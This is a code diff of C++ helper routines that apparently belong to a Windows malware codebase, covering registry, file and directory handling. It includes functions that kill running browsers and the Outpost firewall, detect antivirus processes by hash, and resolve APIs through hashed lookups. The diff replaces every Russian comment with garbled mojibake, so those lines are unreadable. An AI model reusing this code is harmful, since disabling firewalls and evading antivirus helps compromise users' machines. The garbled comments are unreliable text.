+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (pRegQueryValueExA(OpenedKey, Value, NULL, &Type, NULL, &Sz) == ERROR_SUCCESS)
 	{
-		// Читаем строку
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Result = STR::Alloc(Sz);
 		if (pRegQueryValueExA(OpenedKey, Value, NULL, &Type, (LPBYTE)Result, &Sz)  != ERROR_SUCCESS)
 		STR::Free2(Result);;
@@ -1643,8 +1654,8 @@ PCHAR Registry::GetStringValue(HKEY Key, PCHAR SubKey, PCHAR Value)
 
 bool Registry::CreateValueString(HKEY h, char* path, char* name,  char* values )
 {
-  //корневой ключ, путь без ключа, имя создаваемого значения,
- // значение(создает заменяет значение REG_SZ)
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+ // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ REG_SZ)
     HKEY hKey;
 	if((long)pRegOpenKeyExA(h, path, 0, KEY_WRITE, &hKey) == REG_OPENED_EXISTING_KEY)
 	{
@@ -1679,7 +1690,7 @@ bool Registry::CreateValueREGMULTI_SZ(HKEY h, char* path, char* name,  char* val
     }
 	return false;
 }
-// добавляет права SE_BACKUP_NAME
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ SE_BACKUP_NAME
 bool Registry::SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
 {
 	TOKEN_PRIVILEGES tp;
@@ -1704,8 +1715,8 @@ bool Registry::SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
 }
 
 
-//	Есть ли ключ
-//	Вернет  TRUE если да, иначе FALSE
+//	пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
+//	пїЅпїЅпїЅпїЅпїЅпїЅ  TRUE пїЅпїЅпїЅпїЅ пїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ FALSE
 bool Registry::IsKeyExist(HKEY hRoot, LPCSTR KeyPath)
 {
 	HKEY		hKey;
@@ -1727,8 +1738,8 @@ bool Registry::IsKeyExist(HKEY hRoot, LPCSTR KeyPath)
 
 	return ret;
 }
-// сохраняет ключь реестра в файл
-// тобишь Registry::SaveRegKeyPath(HKEY_LOCAL_MACHINE,"Software\\Policies\\Microsoft","d:\\e.txt");
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
+// пїЅпїЅпїЅпїЅпїЅпїЅ Registry::SaveRegKeyPath(HKEY_LOCAL_MACHINE,"Software\\Policies\\Microsoft","d:\\e.txt");
 bool Registry::SaveRegKeyPath(HKEY hRoot, PCHAR SubKey,PCHAR OutFile)
 {
 	bool	ret=true;
@@ -1770,13 +1781,13 @@ bool Registry::SaveRegKeyPath(HKEY hRoot, PCHAR SubKey,PCHAR OutFile)
 
 
 //----------------------------------------------------------------------------
-// FILE - методы для работы с файлами
+// FILE - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //----------------------------------------------------------------------------
 
 
 DWORD File::WriteBufferA(const char* FileName, const LPVOID Buffer, DWORD BufferSize)
 {
-	// Записать данные из буфера в файл. ANSI версия
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ. ANSI пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (FileName == NULL)
 		return 0;
@@ -1798,7 +1809,7 @@ DWORD File::WriteBufferA(const char* FileName, const LPVOID Buffer, DWORD Buffer
 
 DWORD File::WriteBufferW(const wchar_t* FileName, LPVOID Buffer, DWORD BufferSize)
 {
-	// Записать данные из буфера в файл. Unicode версия
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ. Unicode пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (FileName == NULL)
 		return 0;
@@ -1832,7 +1843,7 @@ LPBYTE FileRealReadToBuffer(HANDLE File, DWORD &BufferSize)
     LPBYTE Result = NULL;
 	if (Size > 0)
 	{
-		// Читаем файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		Result = (LPBYTE)MemAlloc(Size);
 		DWORD Readed = 0;
 		if (Result != NULL)
@@ -1848,7 +1859,7 @@ LPBYTE FileRealReadToBuffer(HANDLE File, DWORD &BufferSize)
 
 LPBYTE File::ReadToBufferA(const char* FileName, DWORD &BufferSize)
 {
-	// Прочитать файл в буфер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	if (FileName == NULL)
 		return NULL;
@@ -1862,7 +1873,7 @@ LPBYTE File::ReadToBufferA(const char* FileName, DWORD &BufferSize)
 
 LPBYTE File::ReadToBufferW(const wchar_t* FileName, DWORD &BufferSize)
 {
-	// Прочитать файл в буфер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (FileName == NULL)
 		return NULL;
 
@@ -1875,15 +1886,15 @@ LPBYTE File::ReadToBufferW(const wchar_t* FileName, DWORD &BufferSize)
 
 PCHAR File::ChangeFileExt(PCHAR FileName, PCHAR Ext)
 {
-	// Изменить расширение файла. Касается только строки FileName!!!
-	// Примечание - Расширение меняется вместе с точкой
-	// Результат - НОВАЯ строка с именем файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ FileName!!!
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(FileName))
     	return NULL;
 
 	PCHAR EndPtr = STR::End(FileName);
 
-	// Ишем точку в файле
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	while (*EndPtr != '.')
 	{
 		if (EndPtr == FileName || *EndPtr == '/' || *EndPtr == '\\')
@@ -1953,12 +1964,12 @@ PWCHAR File::GetTempName( PWCHAR buf, const PWCHAR prefix )
 
 PCHAR File::ExtractFileNameA(PCHAR FileName, bool DuplicateStr)
 {
-	//  Функции извлекают имя файла из полного пути
-	//  FileName - полное имя файла, если не содержит разделителей / либо\
-	//  	то функция вернёт всю строку
-	//  DuplicateStr - Установить в истину, если необходимо создать
-	//		новую строку из результата. В случае false функция вернёт указатель
-	//      на первый символ имени в исходной строке
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	//  FileName - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ / пїЅпїЅпїЅпїЅ\
+	//  	пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	//  DuplicateStr - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//		пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ false пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//      пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (STR::IsEmpty(FileName)) return NULL;
 
@@ -2012,7 +2023,7 @@ PWCHAR File::ExtractFileNameW(PWCHAR FileName, bool DuplicateStr)
 
 PCHAR File::ExtractFilePathA(PCHAR FileName)
 {
-	// функция извлекает имя файла из его полного имени
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(FileName))
 		return NULL;
 
@@ -2029,7 +2040,7 @@ PCHAR File::ExtractFilePathA(PCHAR FileName)
 
 DWORD File::GetNameHashA(PCHAR FileName, bool LowerCase)
 {
-	// Функция возвращает хэш имени файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PCHAR Name = ExtractFileNameA(FileName, false);
 	return STRA::Hash(Name, 0, LowerCase);
 }
@@ -2037,17 +2048,17 @@ DWORD File::GetNameHashA(PCHAR FileName, bool LowerCase)
 
 DWORD File::GetNameHashW(PWCHAR FileName, bool LowerCase)
 {
-	// Функция возвращает хэш имени файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PWCHAR Name = ExtractFileNameW(FileName, false);
 	return WSTR::GetHash(Name, 0, LowerCase);
 
 }
 
 //---------------------------------------------------------------------------------
-//Работа с директориями
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------------------------------------
 
-//очистка папки вместе с подпапками, если delFolder = true, то удаляет и саму переданную папку
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ delFolder = true, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 bool Directory::Clear( const char* folder, bool delFolder )
 {
 	WIN32_FIND_DATAA data;
@@ -2066,11 +2077,11 @@ bool Directory::Clear( const char* folder, bool delFolder )
 		m_lstrcpy( fileName, folder );
 		pPathAppendA( fileName.str(), data.cFileName );
 		 
-		//для файлов которые имеет аттрибут только для чтения, снимаем этот аттрибут
+		//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if( data.dwFileAttributes & FILE_ATTRIBUTE_READONLY )
 			pSetFileAttributesA( fileName.str(), data.dwFileAttributes ^ FILE_ATTRIBUTE_READONLY );
 
-		if( data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) //удаляем поддиректорию
+		if( data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			if( !Clear( fileName, true ) )
 			{
@@ -2113,9 +2124,9 @@ bool Directory::IsExists(const PWCHAR Path)
 
 bool CopyFileANdFolder(PCHAR From,PCHAR To)
 {
-	// копируем папку со всем содержимым при этом можно пользоваться маской
-	// пример пользования CopyFileANdFolder("D:\\folder2\0\0","D:\\folder3\\eee\\eee\0\0");
-	// любая строка ДОЛЖНА ОКАНЧИВАИТЬСЯ \0\0 !!
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ CopyFileANdFolder("D:\\folder2\0\0","D:\\folder3\\eee\\eee\0\0");
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ \0\0 !!
 	DWORD attr = (DWORD)pGetFileAttributesA(From);
 	if(attr == INVALID_FILE_ATTRIBUTES) return  false;
 
@@ -2160,9 +2171,9 @@ bool CopyFileANdFolder(PCHAR From,PCHAR To)
 //-----------------------------------------------------------------------------
 bool DeleteFolders(PCHAR From)
 {
-	// удаляет папку со всем содержимым при этом можно пользоваться маской
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// любая строка ДОЛЖНА ОКАНЧИВАИТЬСЯ \0\0 !!
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ \0\0 !!
 	
 
 	SHFILEOPSTRUCT FOperation ;
@@ -2192,10 +2203,10 @@ bool DeleteFolders(PCHAR From)
 
 void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data)
 {
-	// Функция перебирает все подключенные в системе диски
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Method == NULL) return;
 
-	// Получаем список дисков
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	static const DWORD Size = 255;
 	PCHAR Drives = STR::Alloc(Size);
 	if (Drives == NULL)
@@ -2204,7 +2215,7 @@ void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data)
 	pGetLogicalDriveStringsA(Size, Drives);
 
 
-	// Перебираем диски
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	bool Cancel = false;
 	PCHAR Tmp = Drives;
 	while (*Tmp != 0)
@@ -2226,8 +2237,8 @@ void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data)
 
 bool IsExecutableFile(LPVOID Buf)
 {
-	// Функция возвращает истину если буффер является заголовком
-	// exe файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// exe пїЅпїЅпїЅпїЅпїЅ
 	if (Buf == NULL) return false;
 
 
@@ -2239,7 +2250,7 @@ bool IsExecutableFile(LPVOID Buf)
 }
 //----------------------------------------------------------------------------
 
-// Это убрать
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize )
 {
 
@@ -2278,8 +2289,8 @@ LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize )
 // ----------------------------------------------------------------------------------------
 bool isFileExists(int FlagFolderDest, WCHAR*Path)
 {
-	// Эта поебень делает такую-то хуйню
-	// тоесть проверяет существуер ли файл в стандартном пути(определенном системой)+Path  
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)+Path  
 
 	WCHAR SysPath[MAX_PATH];
 	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
@@ -2289,11 +2300,11 @@ bool isFileExists(int FlagFolderDest, WCHAR*Path)
 }
 
 // ----------------------------------------------------------------------------------------
-// Сложно бля пару переводов строки после функции сделать, ну топо разделить код одной функции от другой
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count)
 {
-    // И эта поебень хуёзнает чё-то делает
-	// тоесть создает файл и пишет данные заданным размером
+    // пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	WCHAR SysPath[MAX_PATH];
 	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
@@ -2310,11 +2321,11 @@ bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count)
 int ReadFileA(char *szFileName, char **OutBuf)
 {	
 	int result = 0;
-	// Открываем файл на чтение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	HANDLE hFile = pCreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
 														OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 
-	// Если не удалось прочесть, выходим с ошибкой
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (INVALID_HANDLE_VALUE != hFile)
 	{
 		DWORD fSize = FileSize(hFile);
@@ -2325,7 +2336,7 @@ int ReadFileA(char *szFileName, char **OutBuf)
 			if (pReadFile(hFile, *OutBuf, fSize, &rSize, NULL))
 				result = rSize;
 		}
-		// Закрываем файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		pCloseHandle(hFile);
 	}
 	
@@ -2334,7 +2345,7 @@ int ReadFileA(char *szFileName, char **OutBuf)
 */
 
 /*
-//не проверенно
+//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count)
 {
 	WCHAR SysPath[MAX_PATH];
@@ -2456,7 +2467,7 @@ fwsprintfW Get_wsprintfW()
 	return (fwsprintfW)GetProcAddressEx( NULL, 3, 0xEA3AF0C1 );
 }
 
-//ложит в to папку C:\Documents and Settings\All Users
+//пїЅпїЅпїЅпїЅпїЅ пїЅ to пїЅпїЅпїЅпїЅпїЅ C:\Documents and Settings\All Users
 char* GetAllUsersProfile( char* to, int maxSz )
 {
 	if( pExpandEnvironmentStringsA( "%ALLUSERSPROFILE%", to, maxSz ) > 0 )
@@ -2595,7 +2606,7 @@ static void FuncForSizeFolderLess(PFindData Search, PCHAR FileName, LPVOID Data,
 {
 	Param_SizeFolderLess* param = (Param_SizeFolderLess*)Data;
 	param->size += Search->nFileSizeLow;
-	if( param->size > param->maxSize ) //превысили размер
+	if( param->size > param->maxSize ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Cancel = true;
 }
 
@@ -2613,7 +2624,7 @@ bool SizeFolderLess( const char* nameFolder, DWORD maxSize, DWORD* size )
 
 
 //------------------------------------------------------------
-//  KillAllBrowsers - Функция убивает все запущенные браузеры
+//  KillAllBrowsers - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------------
 void KillAllBrowsers()
 {
@@ -2636,9 +2647,9 @@ void KillAllBrowsers()
 
 
 //------------------------------------------------------------
-//  GetSpecialFolderPath - Функция возвращает путь к
-//                          специальной папке системы
-//  (Надстройка над ЫРGetSpecialFolderPath)
+//  GetSpecialFolderPath - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ
+//                          пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅGetSpecialFolderPath)
 //------------------------------------------------------------
 string GetSpecialFolderPathA(int CSIDL, const char *FileName)
 {
@@ -2685,7 +2696,7 @@ wstring GetSpecialFolderPathW(int CSIDL, const wchar_t *FileName)
 
 
 //------------------------------------------------------------
-//  KillOutpost - Функция убивает процесс файрвола Outpost
+//  KillOutpost - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Outpost
 //------------------------------------------------------------
 void KillOutpost()
 {
@@ -2704,8 +2715,8 @@ void KillOutpost()
 
 
 //****************************************************************
-// ProcessIsAntiVirus - Функция возвращает истину если хэш
-// процессе есть в массиве известных антивирусов
+// ProcessIsAntiVirus - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //****************************************************************
 bool ProcessIsAntiVirus(DWORD Hash)
 {
@@ -2721,12 +2732,12 @@ bool ProcessIsAntiVirus(DWORD Hash)
 
 
 //****************************************************************
-//	GetAntiVirusProcessName - Функция возвращает имя процесса
-//                            запущенного анти вируса
+//	GetAntiVirusProcessName - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//                            пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //****************************************************************
 string GetAntiVirusProcessName()
 {
-	// Функция возвращает имя процесса  работающего антивируса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	string Name;
 
     LPVOID ProcessBuf = GetInfoTable( SystemProcessInformation );
@@ -2761,19 +2772,19 @@ string GetAntiVirusProcessName()
 	return Name;
 }
 
